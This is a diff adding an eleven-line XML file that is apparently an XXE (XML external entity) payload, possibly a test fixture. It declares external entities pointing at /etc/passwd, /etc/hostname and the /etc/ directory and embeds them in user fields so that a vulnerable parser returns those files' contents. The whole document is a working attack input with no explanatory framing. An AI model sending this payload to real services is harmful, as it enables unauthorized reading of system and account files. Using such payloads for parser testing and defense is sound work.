@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [
+   <!ENTITY xxea SYSTEM "file:///etc/passwd">
+   <!ENTITY xxeb SYSTEM "file:///etc/hostname">
+   <!ENTITY xxec SYSTEM "file:///etc/">
+]>
+<user>
+    <passwd>&xxea;</passwd>
+    <hostname>&xxeb;</hostname>
+    <dir>&xxeb;</dir>
+</user>
